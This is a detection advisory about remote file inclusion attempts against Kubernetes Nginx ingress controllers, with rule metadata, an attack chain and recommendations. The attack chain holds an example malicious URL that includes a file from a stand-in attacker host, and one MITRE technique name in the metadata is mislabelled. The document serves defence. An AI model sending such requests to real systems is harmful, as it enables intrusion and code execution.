---
title: Kubernetes Nginx Ingress Remote File Inclusion Attempt
slug: 2024-01-kubernetes-nginx-ingress-rfi
description: This analytic detects remote file inclusion (RFI) attacks targeting Kubernetes Nginx ingress controllers by analyzing Kubernetes logs from the Nginx ingress controller and identifying suspicious URL requests, potentially leading to arbitrary code execution or sensitive data access.
date: "2024-01-03T12:00:00Z"
type: advisory
types:
  - advisory
severities:
  - medium
tags:
  - kubernetes
  - nginx
  - rfi
  - remote file inclusion
  - cloud
vendors:
  - Nginx
  - Kubernetes
products:
  - Nginx Ingress Controller
  - Kubernetes
mitre_ttps:
  - tactic_id: TA0001
    tactic_name: Initial Access
    technique_id: T1212
    technique_name: Exploitation for Privilege Escalation
references:
  - https://github.com/splunk/splunk-connect-for-kubernetes
  - https://www.invicti.com/blog/web-security/remote-file-inclusion-vulnerability/
rules:
  - title: Kubernetes Nginx Ingress RFI Detection
    description: Detects potential Remote File Inclusion (RFI) attempts targeting Kubernetes Nginx ingress controllers by identifying suspicious URL patterns.
    platform: sigma
    severity: medium
    tactics:
      - initial_access
    techniques:
      - T1212
    data_sources:
      - webserver
      - linux
  - title: Kubernetes Nginx Ingress Suspicious File Download in URI
    description: Detects potential attempts to download files via the URI in Kubernetes Nginx Ingress, which could indicate malicious activity or data exfiltration attempts.
    platform: sigma
    severity: medium
    tactics:
      - initial_access
    techniques:
      - T1212
    data_sources:
      - webserver
      - linux
rules_count: 2
---

This analytic focuses on detecting Remote File Inclusion (RFI) attacks against Kubernetes Nginx ingress controllers. RFI attacks exploit vulnerabilities that allow an attacker to include remote files, potentially leading to arbitrary code execution or access to sensitive information. The detection logic parses Kubernetes logs from the Nginx ingress controller, specifically examining the request URLs for suspicious patterns indicative of RFI attempts. Successful exploitation could grant attackers unauthorized access, facilitate data exfiltration, or further compromise the Kubernetes environment. This activity is particularly relevant for organizations using Kubernetes to host web applications and services, as ingress controllers act as the entry point for external traffic.

## Attack Chain

1. An attacker identifies a Kubernetes Nginx ingress controller exposed to the internet.
2. The attacker crafts a malicious HTTP request containing a URL designed to exploit an RFI vulnerability. This URL often includes parameters that attempt to include remote files (e.g., `http://example.com/index.php?file=http://evil.com/malicious.txt`).
3. The attacker sends the malicious request to the Kubernetes Nginx ingress controller.
4. The Nginx ingress controller processes the request and attempts to include the remote file specified in the URL.
5. If the RFI vulnerability is successfully exploited, the attacker's malicious code or script is executed by the Nginx ingress controller.
6. The attacker gains unauthorized access to the Kubernetes environment or sensitive data.
7. The attacker uses the compromised ingress controller as a launchpad for further attacks within the Kubernetes cluster, such as lateral movement or data exfiltration.

## Impact

Successful RFI attacks on Kubernetes Nginx ingress controllers can have significant consequences. Attackers can gain unauthorized access to sensitive data, including application code, configuration files, and credentials. They can also execute arbitrary code, potentially leading to a complete compromise of the Kubernetes cluster. The impact can range from data breaches and service disruptions to the deployment of malicious containers and the exfiltration of confidential information. The specific consequences depend on the nature of the targeted application and the attacker's objectives.

## Recommendation

*   Enable and review Kubernetes container controller logs to capture relevant HTTP request data, as indicated by the `kubernetes_container_controller` macro in the search query.
*   Deploy the provided Sigma rule (`Kubernetes Nginx Ingress RFI Detection`) to identify suspicious URL patterns indicative of RFI attempts. Tune the rule based on your specific environment and application characteristics.
*   Implement regular vulnerability scanning and penetration testing of your Kubernetes Nginx ingress controllers to identify and remediate potential RFI vulnerabilities.
*   Ensure that your Nginx ingress controller is configured with the latest security patches and updates to mitigate known vulnerabilities.
